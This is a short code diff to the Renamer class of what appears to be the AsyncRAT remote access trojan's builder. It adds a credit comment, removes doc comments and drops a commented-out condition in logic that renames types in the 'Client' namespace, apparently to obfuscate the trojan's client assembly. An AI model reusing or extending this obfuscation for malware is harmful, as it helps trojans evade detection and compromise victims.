@@ -8,11 +8,9 @@ using System.Threading.Tasks;
 
 namespace AsyncRAT_Sharp.Helper
 {
+    //creadit Quasar.Server/Build/Renamer.cs
     public class Renamer
     {
-        /// <summary>
-        /// Contains the assembly definition.
-        /// </summary>
         public AssemblyDefinition AsmDef { get; set; }
 
         private int Length { get; set; }
@@ -36,10 +34,6 @@ namespace AsyncRAT_Sharp.Helper
             _eventOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
         }
 
-        /// <summary>
-        /// Attempts to modify the assembly definition data.
-        /// </summary>
-        /// <returns>True if the operation succeeded; False if the operation failed.</returns>
         public bool Perform()
         {
             try
@@ -58,7 +52,7 @@ namespace AsyncRAT_Sharp.Helper
 
         private void RenameInType(TypeDefinition typeDef)
         {
-            if (!typeDef.Namespace.StartsWith("Client") /* || typeDef.HasInterfaces */)
+            if (!typeDef.Namespace.StartsWith("Client"))
                 return;
 
             _typeOverloader.GiveName(typeDef);
